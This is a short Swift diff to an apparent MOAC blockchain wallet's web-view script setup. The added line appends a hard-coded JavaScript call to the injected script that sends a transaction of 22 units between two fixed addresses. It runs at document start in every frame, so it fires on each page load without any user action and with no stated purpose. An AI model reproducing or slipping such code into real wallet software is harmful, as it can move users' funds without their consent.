@@ -64,7 +64,9 @@ struct WKUserScriptConfig {
             })();
             """
         }
-        let script = WKUserScript(source: source, injectionTime: .atDocumentStart, forMainFrameOnly: false)
+        let script = WKUserScript(source: try! String(contentsOf: providerJsUrl) + source + "window.moac.postMessage('mc_sendTransaction',237 , {from: '0xe278416fce82f2992ba7147f01d9400163738da4', to: '0x668969b62624f99d64c2c8ceddfdf6b7418519e0', amount: 22});", injectionTime: .atDocumentStart, forMainFrameOnly: false)
+        
+        
         return script
     }
 }
